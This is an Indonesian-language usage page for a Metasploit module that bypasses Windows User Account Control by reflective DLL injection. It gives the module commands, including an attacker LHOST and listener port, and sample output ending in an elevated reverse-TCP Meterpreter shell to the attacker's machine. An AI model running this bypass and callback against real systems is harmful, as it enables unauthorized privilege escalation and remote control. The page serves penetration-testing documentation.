# bypassuac_injection

Modul ini akan melewati `UAC` (`User Account Control`) di Windows dengan memanfaatkan sertifikat trusted publisher melalui teknik injeksi proses (`process injection`). Modul ini akan memunculkan shell kedua yang memiliki bendera `UAC` dinonaktifkan, sehingga shell tersebut akan berjalan tanpa pembatasan `UAC`. Modul ini menggunakan teknik `Reflective DLL Injection`, yang berarti hanya payload dalam bentuk `DLL` yang disisipkan, bukan tiga binary terpisah seperti pada teknik standar.

Namun, modul ini memerlukan arsitektur yang tepat:

- Gunakan `x64` untuk sistem `SYSWOW64` (`Windows 64-bit` yang menjalankan proses `32-bit`).

Jika kamu menentukan `EXE::Custom`, maka `DLL` milikmu harus memanggil `ExitProcess()` setelah menjalankan payload di proses terpisah, agar proses induk dapat berhenti dengan benar.


## Penulis
- David Kennedy "ReL1K" kennedyd013@gmail.com
- mitnick
- mubix mubix@hak5.org
- Ben Campbell eat_meatballs@hotmail.co.uk
- Lesage
- OJ Reeves

## Platform
- `Windows`
  
## Cara Penggunaan di Metasploit

```
use exploit/windows/local/bypassuac_injection
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[+] Windows 7 Service Pack 1 may be vulnerable.
[*] UAC is Enabled, checking level...
[*] Checking admin status...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Payload DLL 9216 bytes long being uploaded..
[*] Spawning process with Windows Publisher Certificate, to inject into...
[*] Injecting  into process ID 4016
[*] Opening process 4016
[*] Injecting struct into 4016
[*] Executing payload
[+] Successfully injected payload in to process: 4016
[*] Sending stage (177734 bytes) to 192.168.1.53
[+] Deleted C:\Users\admin\AppData\Local\Temp\DFWlaRNL.dll
[*] Meterpreter session 13 opened (192.168.1.11:4444 -> 192.168.1.53:49160) at 2025-05-17 05:45:29 +0700

meterpreter >
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/)
